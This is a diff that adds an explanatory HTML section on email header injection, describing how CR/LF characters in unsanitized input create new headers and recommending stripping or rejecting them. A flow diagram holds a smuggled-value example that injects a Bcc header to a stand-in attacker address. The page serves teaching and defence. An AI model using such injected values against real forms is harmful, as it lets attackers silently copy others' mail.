@@ -1,0 +1,25 @@
+<p>Email headers are separated by CRLF (<code>\r\n</code>). If application
+code builds a header value by directly concatenating unsanitized user input
+-- say, a web form's "subject" field passed straight into an email header --
+and that input contains a raw CR or LF character, a naive parser reads
+everything after the newline as a <b>new header</b>, not part of the
+original value.</p>
+<div class="flow-diagram">
+  <div class="flow-step accent"><div class="flow-icon">⌨️</div><div class="flow-title">User Input</div><div class="flow-desc">"Order confirmation\nBcc: attacker@evil.com"</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-step"><div class="flow-icon">🧩</div><div class="flow-title">Naive Concatenation</div><div class="flow-desc">Dropped straight into "Subject: " + input</div></div>
+  <div class="flow-arrow">→</div>
+  <div class="flow-branch">
+    <div class="flow-step bad" style="width:180px"><div class="flow-title">Unsanitized</div><div class="flow-desc">Parser sees TWO headers — forged Bcc smuggled in</div></div>
+    <div class="flow-step good" style="width:180px"><div class="flow-title">Sanitized</div><div class="flow-desc">CR/LF stripped — stays ONE header</div></div>
+  </div>
+</div>
+<p>This is directly analogous to SQL injection or HTTP response splitting:
+the vulnerability class is "attacker-controlled data crosses into a
+control-plane position because a delimiter wasn't stripped or escaped."
+Historically, this let attackers inject an extra <code>Bcc:</code> to
+silently copy themselves on outgoing mail, or even smuggle an entirely new
+<code>MIME</code> part.</p>
+<p>The fix is simple and absolute: <b>never</b> allow raw CR or LF characters
+into a header value. Strip them, reject them, or encode them -- never pass
+them through.</p>
